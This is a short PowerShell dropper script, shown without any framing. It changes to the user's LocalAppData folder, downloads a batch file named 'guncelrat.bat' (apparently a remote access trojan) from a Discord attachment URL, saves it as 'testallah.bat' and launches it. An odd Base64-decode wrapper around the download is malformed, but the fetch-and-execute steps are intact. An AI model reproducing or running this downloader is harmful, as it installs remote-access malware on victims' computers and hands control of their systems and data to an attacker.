cd $env:LOCALAPPDATA

& ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((Invoke-WebRequest -Uri "https://cdn.discordapp.com/attachments/963507982962942042/1021144136465784974/guncelrat.bat" -OutFile testallah.bat)))) 

cd $env:LOCALAPPDATA
start "$env:LOCALAPPDATA\testallah.bat"